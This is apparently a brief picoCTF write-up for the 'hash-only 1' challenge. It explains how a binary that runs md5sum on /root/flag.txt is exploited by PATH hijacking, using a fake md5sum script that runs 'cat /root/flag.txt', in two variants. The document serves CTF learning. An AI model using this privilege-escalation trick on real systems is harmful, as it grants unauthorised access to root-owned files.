picoctf hash-only 1 writeup

1.connect to server and we can find a binary file 

2.just execute it and it print a flag which is encrypted by md5

3.we can use "cp -P 55610 ctf-player@shape-facility.picoctf.net:~/flaghasher ." to copy this binary to our machine

4.i use ghidra to decompiler it and i find it just execute "/bin/bash -c \'md5sum /root/flag.txt\'"

5.so we create a /md5sum binary to print the flag and trick the system to use our script

method one:
=> echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum
=> chmod +x md5sum
=> export PATH=.:$PATH

# you can use "which md5sum" in home dir to check whether it is successful

method two:
=> echo -e '#!/bin/bash\ncat "$@"\n/bin/md5sum "$@"' > md5sum
=> chmod +x md5sum
=> PATH=.:$PATH ./flaghasher

6.get flag!
